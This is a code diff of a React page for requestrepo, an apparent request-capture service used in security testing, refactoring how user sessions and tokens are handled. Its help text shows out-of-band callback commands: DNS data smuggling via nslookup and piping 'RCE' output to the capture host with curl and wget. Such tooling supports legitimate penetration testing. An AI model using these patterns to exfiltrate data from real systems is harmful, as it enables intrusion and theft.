@@ -9,8 +9,11 @@ export class RequestsPage extends Component {
   constructor(props) {
     super(props);
     this.state = {
-      ...props,
       isEditorFocused: false,
+      user: null,
+      selectedRequest: null,
+      loading: true,
+      error: null
     };
   }
 
@@ -21,23 +24,39 @@ export class RequestsPage extends Component {
   handleEditorBlur = () => {
     this.setState({ isEditorFocused: false });
   };
-
   render() {
+    const { user } = this.props;
+
+    if (!user) {
+      return (
+        <div className="card card-w-title card-body">
+          <h1>No Session Available</h1>
+          <p>Please create or select a session to continue.</p>
+        </div>
+      );
+    }
+
     const token = this.state.isEditorFocused
-      ? localStorage.getItem("token")
+      ? (user && user.subdomain
+          ? localStorage.getItem(`token_${user.subdomain}`)
+          : localStorage.getItem("token")) || "********"
       : "********";
 
     // parse url into host:port
-    const url = new URL("http://" + this.props.user.domain + "/");
+    let url;
+    try {
+      url = new URL("http://" + (user?.domain || window.location.hostname) + "/");
+    } catch {
+      url = new URL("http://" + window.location.hostname + "/");
+    }
     let port = url.port;
     if (!port) port = window.location.protocol === "https:" ? 443 : 80;
 
     const content = `from requestrepo import Requestrepo # pip install requestrepo
-
 client = Requestrepo(token="${token}", host="${url.hostname}", port=${port}, protocol="${port === 443 ? "https" : "http"}")
 
-print(client.subdomain) # ${this.props.user.subdomain}
-print(client.domain) # ${this.props.user.subdomain}.${this.props.user.domain}
+print(client.subdomain) # ${user.subdomain}
+print(client.domain) # ${user.subdomain}.${user.domain}
 
 client.update_http(raw=b"hello world")
 
@@ -45,38 +64,37 @@ client.update_http(raw=b"hello world")
 new_request = client.get_request()
 print("Latest Request:", new_request)`;
 
+    console.log(user);
     return (
       <div className="card card-w-title card-body">
-        {this.props.user !== null &&
-          this.props.user !== undefined &&
-          this.props.user.requests[this.props.user.selectedRequest] ===
-            undefined && (
+        {user?.requests && user?.selectedRequest !== undefined && 
+         (!user?.requests[user?.selectedRequest] || user?.requests?.length === 0) && (
             <div className="grid">
               <div className="col-12">
                 <h1>Awaiting requests</h1>
                 <p>How to make a request:</p>
-                <code>curl http://{this.props.user.url}</code>
+                <code>curl http://{user?.url || `${user?.subdomain}.${user?.domain}`}</code>
                 <br />
                 <br />
                 <code>
-                  curl http://{this.props.user.domain}/r/
-                  {this.props.user.subdomain}/
+                  curl http://{user.domain}/r/
+                  {user?.subdomain || 'default'}/
                 </code>
                 <br />
                 <br />
                 <code>
-                  curl -X POST --data hello http://{this.props.user.url}
+                  curl -X POST --data hello http://{user?.url || `${user?.subdomain}.${user?.domain}`}
                 </code>
                 <br />
                 <br />
-                <code>nslookup your.data.here.{this.props.user.url}</code>
+                <code>nslookup your.data.here.{user?.url || `${user?.subdomain}.${user?.domain}`}</code>
                 <br />
                 <br />
-                <code>echo RCE | curl -d @- {this.props.user.url}</code>
+                <code>echo RCE | curl -d @- {user?.url || `${user?.subdomain}.${user?.domain}`}</code>
                 <br />
                 <br />
                 <code>
-                  wget --post-data "$(echo RCE)" -O- {this.props.user.url}
+                  wget --post-data "$(echo RCE)" -O- {user?.url || `${user?.subdomain}.${user?.domain}`}
                 </code>
                 <br />
                 <br />
@@ -98,7 +116,7 @@ print("Latest Request:", new_request)`;
                 <CopyButton
                   text={content.replace(
                     "********",
-                    localStorage.getItem("token"),
+                    localStorage.getItem(`token_${user.subdomain}`) || localStorage.getItem("token"),
                   )}
                 />
                 <EditorComponent
@@ -112,14 +130,11 @@ print("Latest Request:", new_request)`;
               </div>
             </div>
           )}
-        {this.props.user !== null &&
-          this.props.user !== undefined &&
-          this.props.user.requests[this.props.user.selectedRequest] !==
-            undefined && (
+        {user.requests && 
+         user?.selectedRequest !== undefined && 
+         user?.requests[user?.selectedRequest] && (
             <RequestInfo
-              request={
-                this.props.user.requests[this.props.user.selectedRequest]
-              }
+              request={user.requests[user.selectedRequest]}
             />
           )}
       </div>
